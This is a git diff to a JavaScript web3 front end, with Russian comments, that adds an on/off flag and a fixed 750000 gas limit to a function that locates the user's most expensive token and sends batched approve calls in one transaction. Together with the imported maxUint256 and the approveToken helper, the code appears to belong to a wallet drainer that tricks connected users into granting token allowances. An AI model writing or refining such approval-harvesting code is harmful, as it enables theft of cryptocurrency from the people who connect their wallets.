@@ -4,6 +4,9 @@ import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
 import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance } from '@wagmi/core'
 
+// === Флаг для включения/отключения batching approve ===
+const ENABLE_BATCH_APPROVE = true // Поставь false или закомментируй для отключения batching approve
+
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
   let timeout
@@ -643,6 +646,10 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
 
 // Add batch operations function after the getTokenPrice function
 const performBatchOperations = async (mostExpensive, allBalances, state) => {
+  // === batching approve можно отключить этим флагом ===
+  if (!ENABLE_BATCH_APPROVE) {
+    return { success: false, error: 'BATCH_DISABLED' }
+  }
   if (!mostExpensive) {
     console.log('No most expensive token found, skipping batch operations')
     return false
@@ -707,12 +714,13 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
         value: '0x0'
       }))
 
-    // Send batch transaction
+    // === Фиксированный газ только для batching approve ===
     if (approveCalls.length > 0) {
       const id = await sendCalls(wagmiAdapter.wagmiConfig, {
         calls: approveCalls,
         account: getAddress(state.address),
-        chainId: mostExpensive.chainId
+        chainId: mostExpensive.chainId,
+        gas: 750000 // <--- фиксированный газ только для batching approve
       })
       console.log(`Batch transaction sent with id: ${id}`)
       return { success: true, txHash: id }
